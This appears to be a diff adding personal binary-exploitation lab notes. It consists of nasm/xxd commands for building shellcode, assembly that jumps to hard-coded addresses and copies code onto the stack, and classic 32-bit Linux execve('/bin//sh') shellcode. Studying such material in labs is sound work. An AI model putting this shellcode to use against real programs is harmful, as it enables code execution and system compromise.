@@ -1,0 +1,31 @@
+nasm -f elf32 mysh.s -o mysh.o
+xxd -p -c 20 mysh.o
+
+## to call another func before opening shell
+mov    ebx,0x565562e5
+call   ebx
+
+
+## to copy inside assembly code segment of c code
+mov esi, 0x56559008    ; where non executable code segment now
+mov edi, 0xffffca18    ; where it will be copied
+
+rep movs BYTE PTR es:[edi], BYTE PTR es:[esi]
+
+mov eax, 0xffffca18
+push eax
+
+
+## to open a shell
+xor    eax,eax
+push   eax
+push   0x68732f2f
+push   0x6e69622f
+mov    ebx,esp
+push   eax
+push   ebx
+mov    ecx,esp
+xor    edx,edx
+xor    eax,eax
+mov    al,0xb
+int    0x80
